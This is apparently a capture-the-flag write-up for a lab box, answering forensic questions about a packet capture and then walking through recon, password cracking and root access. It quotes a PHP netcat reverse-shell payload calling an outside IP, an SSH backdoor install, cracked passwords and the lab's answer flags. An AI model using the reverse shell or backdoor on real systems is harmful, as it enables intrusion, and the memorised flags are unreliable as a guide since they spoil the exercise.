```
What was the URL of the page they used to upload a reverse shell?

Referer: http://192.168.170.159/development/

What payload did the attacker use to gain access?

<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

What password did the attacker use to privesc?
whenevernoteartinstant

How did the attacker establish persistence?
git clone https://github.com/NinjaJc01/ssh-backdoor

Using the fasttrack wordlist, how many of the system passwords were crackable?
john --wordlist=rockyou.txt shadow.txt
1qaz2wsx         (muirland)
abcd123          (szymex)
secret12         (bee)
secuirty3        (paradox)

We downloaded the tool ssh-backdoor and found the hash and salt.

What's the hardcoded salt for the backdoor?
1c362db832f3f864c8c2fe05f2002a05

hashcat -m 1710 hash --force /snap/john-the-ripper/rockyou.txt
november16

export IP=10.10.128.58
Nmap
------------------------------------------------
nmap -A -sC -sV -T4 -Pn -p- -oN nmap/initial $IP

22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)
|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)
|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LOL Hacked
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)
------------------------------------------------

Gobuster
------------------------------------------------
gobuster -u http://$IP -w /usr/share/wordlists/DirBuster-Lists/directory-list-2.3-medium.txt -t 20 -o gobuster_init

/img (Status: 301)
/downloads (Status: 301)
/aboutus (Status: 301)
/css (Status: 301)
------------------------------------------------

In pcapng file we found that 
./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

<9d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222

james@overpass-production

ssh james@$IP -p 2222
Password: november16

user.txt
===========================
thm{d119b4fa8c497ddb0525f7ad200e6567}
===========================

We find a file .suid_bash in james's home dir.
./suid_bash -p 
gives us our root shell

root.txt
===========================
thm{d53b2684f169360bb9606c333873144d}
===========================
```